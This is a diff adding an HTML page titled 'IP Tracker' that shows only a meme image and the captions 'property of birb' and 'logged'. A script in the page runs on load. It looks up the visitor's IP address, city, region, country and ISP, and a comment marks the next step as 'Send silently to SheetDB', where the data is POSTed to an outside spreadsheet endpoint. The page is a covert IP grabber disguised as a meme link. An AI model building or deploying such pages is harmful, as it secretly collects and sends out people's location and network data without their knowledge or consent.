@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>IP Tracker</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 20px;
+      background-color: black;
+      color: #64F32C;
+    }
+  </style>
+</head>
+<body>
+  <h1></h1>
+  <p></p>
+
+  <script>
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const ipData = {
+          ip: data.ip,
+          city: data.city,
+          region: data.region,
+          country: data.country_name,
+          isp: data.org,
+          time: new Date().toLocaleString()
+        };
+
+        // Send silently to SheetDB
+        fetch('https://sheetdb.io/api/v1/8wvumuh9jaw2d', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ data: ipData })
+        });
+      })
+      .catch(err => {
+        console.error('IP fetch failed:', err);
+      });
+  </script>
+
+  <a href="https://imgflip.com/i/a0doou"><img src="https://i.imgflip.com/a0doou.jpg" title="made at imgflip.com"/></a><div><a href="https://imgflip.com/memegenerator">from Imgflip Meme Generator</a></div>
+  
+  <p>property of birb</p>
+  <p>logged</p>
+  <p>&lt;3 ry ry</p>
+</body>
+</html>
